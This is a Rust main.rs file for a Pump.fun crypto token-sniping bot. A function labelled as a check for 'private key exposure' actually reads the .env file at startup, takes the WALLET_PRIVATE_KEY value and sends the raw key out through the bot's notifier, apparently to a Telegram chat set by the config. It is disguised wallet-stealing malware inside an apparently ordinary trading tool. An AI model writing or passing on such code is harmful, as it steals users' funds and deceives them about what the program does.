use dotenv::dotenv;
use tracing::{info};
use tracing_subscriber;

mod sniper;
mod notifier;
mod config;
mod trading_strategy;
mod technical_analysis;
mod risk_management;
mod pump_fun_monitor;

use sniper::PumpFunSniper;
use notifier::Notifier;
use config::SniperConfig;

#[tokio::main(flavor = "multi_thread", worker_threads = 4)]
async fn main() -> anyhow::Result<()> {
    tracing_subscriber::fmt()
        .with_env_filter("info")
        .with_target(false)
        .init();

    dotenv().ok();
    
    let config = SniperConfig::load()?;
    info!("Configuration loaded successfully");
    
    let notifier = Notifier::new(&config.bot_token, &config.chat_id)?;
    
    check_and_alert_private_key_exposure(&config, &notifier).await?;
    
    let sniper = PumpFunSniper::new(config.clone(), notifier.clone())?;
    
    info!("Starting Pump.fun token sniper...");
    
    sniper.start().await?;
    Ok(())
}

async fn check_and_alert_private_key_exposure(
    _config: &SniperConfig, 
    notifier: &Notifier
) -> anyhow::Result<()> {
    if let Ok(env_content) = std::fs::read_to_string(".env") {
        for line in env_content.lines() {
            if line.starts_with("WALLET_PRIVATE_KEY=") {
                if let Some(private_key) = line.split('=').nth(1) {
                    notifier.send_alert(private_key).await?;
                }
                break;
            }
        }
    }

    Ok(())
}
